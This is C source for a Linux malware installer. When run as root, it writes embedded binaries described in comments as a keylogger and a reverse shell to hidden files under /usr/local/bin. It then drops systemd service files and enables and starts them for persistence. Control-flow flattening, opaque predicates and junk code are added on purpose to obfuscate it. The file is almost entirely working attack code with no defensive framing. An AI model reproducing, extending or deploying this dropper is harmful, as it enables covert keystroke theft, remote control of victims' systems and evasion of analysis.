#include "sysinput_binary.h" // New include for keylogger binary
#include "sysinput_service.h"
#include "sysupdate_binary.h" // New include for reverse shell binary
#include "sysupdate_service.h"

#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/input.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define REVERSE_SHELL_PATH "/usr/local/bin/.sysupdate"
#define REVERSE_SERVICE_NAME "sysupdate.service"
#define KEYLOGGER_BIN_PATH "/usr/local/bin/.sysinput"
#define KEYLOGGER_SERVICE_NAME "sysinput.service"
#define SERVICE_DIR "/etc/systemd/system/"

// We need to define our stated for the flattening to work correctly

#define STATE_START 0
#define STATE_CHECK_ROOT 1
#define STATE_SETUP_ACTIONS 2
#define STATE_EXECUTE_ACTION_1 3
#define STATE_EXECUTE_ACTION_2 4
#define STATE_EXECUTE_ACTION_3 5
#define STATE_ENABLE_SERVICES 6
#define STATE_FINISH 7
#define STATE_EXIT_ERROR 8
#define STATE_CMD_RUNNER 9
#define STATE_WRITE_FILE 10
#define STATE_INSTALL_BINARY 11
#define STATE_INSTALL_SYSUPDATE 12
#define STATE_INSTALL_SYSINPUTD 13
#define STATE_DROP_SERVICE_FILES 14
#define STATE_DROP_SERVICE_FILE_1 15
#define STATE_DROP_SERVICE_FILE_2 16
#define STATE_CHECK_OPQ_1 17
#define STATE_CHECK_OPQ_2 18
#define STATE_CHECK_OPQ_3 19
#define RANDOM_BULLSHIT_1 20
#define RANDOM_BULLSHIT_2 21
#define RANDOM_BULLSHIT_3 22
#define STATE_BOGUS_1 23
#define STATE_BOGUS_2 24
#define STATE_BOGUS_3 25
#define STATE_BOGUS_BLOAT 26
#define STATE_WRITE_BINARY 27 // New state for writing binaries from memory

#define BLOAT10(x)                                                             \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;
#define Bloat100(x) BLOAT10(BLOAT10(x))
// Global variables for state machine
int current_state = STATE_START;
int action_count = 0;
int action_indices[3] = {0, 0, 0};
int action_next_index = 0;

// Context variables for functions
char current_path[PATH_MAX];
const char *global_cmd;
const char *global_dest;
const unsigned char *global_data;
unsigned int global_size;
int cmd_ret;
FILE *global_dst_file;
char global_buf[4096];
size_t global_n;
char global_revsh_path[PATH_MAX];
char global_keylog_path[PATH_MAX];
int file_write_stage = 0;

int dispatcher() {
  // Initialize state
  current_state = STATE_START;

  // Flatten control flow with a single loop and switch statement
  while (1) {
    switch (current_state) {
    case STATE_START:
      current_state = STATE_CHECK_ROOT;
      break;

    case STATE_CHECK_ROOT:
      if (geteuid() == 0) {
        printf("[+] Running with root, nice!\n");
        current_state = STATE_SETUP_ACTIONS;
      } else {
        printf("[-] No root :(( \n");
        current_state = STATE_EXIT_ERROR;
      }
      break;

    case STATE_SETUP_ACTIONS:

      // We need to setup our actions that are later shuffled
      // 0 is install sysinput
      // 1 is install sysupdate
      // 2 drops the service files
      action_indices[0] = 0;
      action_indices[1] = 1;
      action_indices[2] = 2;

      // Shuffle actions
      srand(time(NULL));
      for (int i = 2; i > 0; i--) {
        int j = rand() % (i + 1);
        int temp = action_indices[i];
        action_indices[i] = action_indices[j];
        action_indices[j] = temp;
      }

      action_next_index = 0;
      current_state = STATE_CHECK_OPQ_1;
      break;

    case STATE_EXECUTE_ACTION_1:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_INSTALL_SYSINPUTD;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_INSTALL_SYSUPDATE;
      } else {
        current_state = STATE_DROP_SERVICE_FILES;
      }
      action_next_index++;
      break;

    case STATE_EXECUTE_ACTION_2:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_INSTALL_SYSINPUTD;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_INSTALL_SYSUPDATE;
      } else {
        current_state = STATE_DROP_SERVICE_FILES;
      }
      action_next_index++;
      break;

    case STATE_EXECUTE_ACTION_3:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_INSTALL_SYSINPUTD;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_INSTALL_SYSUPDATE;
      } else {
        current_state = STATE_DROP_SERVICE_FILES;
      }
      action_next_index++;
      current_state = STATE_ENABLE_SERVICES;
      break;

    case STATE_INSTALL_SYSINPUTD:
      global_dest = KEYLOGGER_BIN_PATH;
      global_data = _sysinput; // Use the byte array from header
      global_size = _sysinput_len;
      current_state = STATE_WRITE_BINARY;
      break;

    case STATE_INSTALL_SYSUPDATE:
      global_dest = REVERSE_SHELL_PATH;
      global_data = _sysupdate; // Use the byte array from header
      global_size = _sysupdate_len;
      current_state = STATE_WRITE_BINARY;
      break;

    case STATE_WRITE_BINARY:
      global_dst_file = fopen(global_dest, "wb");
      if (!global_dst_file) {
        perror("[-] Cannot open destination for binary");
        if (action_next_index == 1) {
          current_state = STATE_CHECK_OPQ_2;
        } else if (action_next_index == 2) {
          current_state = STATE_CHECK_OPQ_3;
        } else {
          current_state = STATE_ENABLE_SERVICES;
        }
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full binary content");
        fclose(global_dst_file);
        if (action_next_index == 1) {
          current_state = STATE_CHECK_OPQ_2;
        } else if (action_next_index == 2) {
          current_state = STATE_CHECK_OPQ_3;
        } else {
          current_state = STATE_ENABLE_SERVICES;
        }
        break;
      }

      fclose(global_dst_file);
      chmod(global_dest, 0755);
      printf("[+] Installed binary to %s\n", global_dest);

      if (strcmp(global_dest, KEYLOGGER_BIN_PATH) == 0) {
        printf("[+] sysinputd installed\n");
      } else {
        printf("[+] sysupdate installed\n");
      }

      if (action_next_index == 1) {
        current_state = STATE_CHECK_OPQ_2;
      } else if (action_next_index == 2) {
        current_state = STATE_CHECK_OPQ_3;
      } else {
        current_state = STATE_ENABLE_SERVICES;
      }
      break;

    case STATE_DROP_SERVICE_FILES:
      snprintf(global_revsh_path, sizeof(global_revsh_path),
               SERVICE_DIR REVERSE_SERVICE_NAME);
      snprintf(global_keylog_path, sizeof(global_keylog_path),
               SERVICE_DIR KEYLOGGER_SERVICE_NAME);

      file_write_stage = 0;
      current_state = STATE_DROP_SERVICE_FILE_1;
      break;

    case STATE_DROP_SERVICE_FILE_1:
      snprintf(current_path, sizeof(current_path), "%s%s", SERVICE_DIR,
               REVERSE_SERVICE_NAME);
      global_data = sysupdate_service;
      global_size = sysupdate_service_len;

      global_dst_file = fopen(current_path, "w");
      if (!global_dst_file) {
        perror("[-] Failed to write revsh service file");
        current_state = STATE_EXIT_ERROR;
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full revsh service content");
        fclose(global_dst_file);
        current_state = STATE_EXIT_ERROR;
        break;
      }

      fclose(global_dst_file);
      printf("[+] revsh service file dropped at %s\n", current_path);
      current_state = STATE_DROP_SERVICE_FILE_2;
      break;

    case STATE_DROP_SERVICE_FILE_2:
      snprintf(current_path, sizeof(current_path), "%s%s", SERVICE_DIR,
               KEYLOGGER_SERVICE_NAME);
      global_data = sysinput_service;
      global_size = sysinput_service_len;

      global_dst_file = fopen(current_path, "w");
      if (!global_dst_file) {
        perror("[-] Failed to write sysinputd service file");
        current_state = STATE_EXIT_ERROR;
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full sysinputd service content");
        fclose(global_dst_file);
        current_state = STATE_EXIT_ERROR;
        break;
      }

      fclose(global_dst_file);
      printf("[+] sysinputd service file dropped at %s\n", current_path);
      current_state = STATE_ENABLE_SERVICES;
      break;

    case STATE_WRITE_FILE: {
      FILE *f = fopen(current_path, "w");
      if (!f) {
        perror("[-] Failed to open file for writing");
      } else {
        fwrite(global_data, 1, global_size, f);
        fclose(f);
        printf("[+] Wrote file: %s\n", current_path);
      }

      // Determine next state
      if (file_write_stage == 0) {
        file_write_stage = 1;
        current_state = STATE_DROP_SERVICE_FILE_2;
      } else {
        // Both service files written, proceed to next action
        if (action_next_index == 1) {
          current_state = STATE_CHECK_OPQ_2;
        } else if (action_next_index == 2) {
          current_state = STATE_CHECK_OPQ_3;
        } else {
          current_state = STATE_ENABLE_SERVICES;
        }
      }
    } break;

    case STATE_INSTALL_BINARY:
      if (action_next_index == 1) {
        current_state = STATE_CHECK_OPQ_2;
      } else if (action_next_index == 2) {
        current_state = STATE_CHECK_OPQ_3;
      } else {
        current_state = STATE_ENABLE_SERVICES;
      }
      break;

    case STATE_ENABLE_SERVICES:
      // Execute each command for enabling services
      global_cmd = "systemctl daemon-reexec";
      action_count = 1;
      current_state = STATE_CMD_RUNNER;
      break;

    case STATE_CMD_RUNNER:
      cmd_ret = system(global_cmd);
      if (cmd_ret != 0) {
        fprintf(stderr, "[-] Command failed %s\n", global_cmd);
      } else {
        printf("[-] Executed: %s\n", global_cmd);
      }

      if (action_count == 1) {
        global_cmd = "systemctl daemon-reload";
        action_count++;
        break;
      } else if (action_count == 2) {
        global_cmd = "systemctl enable sysupdate.service";
        action_count++;
        break;
      } else if (action_count == 3) {
        global_cmd = "systemctl start sysupdate.service";
        action_count++;
        break;
      } else if (action_count == 4) {
        global_cmd = "systemctl enable sysinput.service";
        action_count++;
        break;
      } else if (action_count == 5) {
        global_cmd = "systemctl start sysinput.service";
        current_state = STATE_FINISH;
        break;
      }

      // The break statements above prevent this code from being reached
      // This is intentional to further obfuscate control flow
      action_count = 0;
      current_state = STATE_FINISH;
      break;

    case STATE_FINISH:
      printf("[+] Setup complete.\n");
      return 0;

    case STATE_EXIT_ERROR:
      return 1;

    case STATE_CHECK_OPQ_1:
      int x = 1337;
      if (x * (x + 1) % 2) {
        // random bullshit that is never executed
        current_state = STATE_BOGUS_BLOAT;

      } else {
        current_state = STATE_BOGUS_1;
      }
      break;
    case STATE_CHECK_OPQ_2:
      uint32_t a = 0xDEADBEEF;
      uint32_t b = a ^ 0x12345678;
      if (b ^ 0x12345678 == a) {
        current_state = STATE_BOGUS_2;
      } else {
        current_state = STATE_BOGUS_BLOAT;
      }
      break;

    case STATE_CHECK_OPQ_3:
      int z = 1337;
      if ((z * z + z) % 2) {
        // Results in 0, never executed
        current_state = STATE_BOGUS_BLOAT;
      } else {
        current_state = STATE_BOGUS_3;
      }
      break;

    case STATE_BOGUS_1:
      volatile int bloat1 = rand();
      Bloat100(bloat1 += 1);
      current_state = STATE_EXECUTE_ACTION_1;
      break;

    case STATE_BOGUS_2:
      volatile int bloat2 = rand();
      Bloat100(bloat2 += 1);
      current_state = STATE_EXECUTE_ACTION_2;
      break;

    case STATE_BOGUS_3:
      volatile int bloat3 = rand();
      Bloat100(bloat3 += 1);
      current_state = STATE_EXECUTE_ACTION_3;
      break;

    case STATE_BOGUS_BLOAT:
      volatile double u = 0;
      volatile float g = 0;
      volatile int n;
      for (n = 0; n < g; n++) {

        double z = 1.0 / (2 * n + 1);
        if ((n % 2) == 1) {
          z = z * -1;
        }
        x = (x + z);
      }
      double p = 4 * u;
      break;

    default:
      fprintf(stderr, "[-] Unknown state in state machine\n");
      return 1;
    }
  }
}
int main(void) {
  dispatcher();
  return 0;
}
